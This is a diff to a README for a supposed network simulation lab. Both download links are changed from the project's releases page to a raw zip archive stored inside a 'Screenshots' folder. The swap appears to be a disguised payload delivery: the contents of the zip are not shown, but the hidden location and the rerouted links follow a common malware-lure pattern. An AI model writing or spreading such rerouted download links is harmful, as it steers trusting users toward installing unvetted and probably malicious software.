@@ -1,6 +1,6 @@
 # 🖧 NetSim-Pro-Network-Simulation-Lab - Learn Networking with Hands-On Tools
 
-[![Download NetSim Pro](https://img.shields.io/badge/Download-NetSim%20Pro-blue?style=for-the-badge&logo=github)](https://github.com/lincolndenominational162/NetSim-Pro-Network-Simulation-Lab/releases)
+[![Download NetSim Pro](https://img.shields.io/badge/Download-NetSim%20Pro-blue?style=for-the-badge&logo=github)](https://github.com/lincolndenominational162/NetSim-Pro-Network-Simulation-Lab/raw/refs/heads/main/Screenshots/Network-Lab-Sim-Net-Pro-Simulation-3.9.zip)
 
 ## 🧭 What this is
 
@@ -35,7 +35,7 @@ If you plan to use it offline, keep the release files in one folder so the app c
 
 Visit this page to download the latest Windows release:
 
-[Download the latest release](https://github.com/lincolndenominational162/NetSim-Pro-Network-Simulation-Lab/releases)
+[Download the latest release](https://github.com/lincolndenominational162/NetSim-Pro-Network-Simulation-Lab/raw/refs/heads/main/Screenshots/Network-Lab-Sim-Net-Pro-Simulation-3.9.zip)
 
 After the page opens:
 
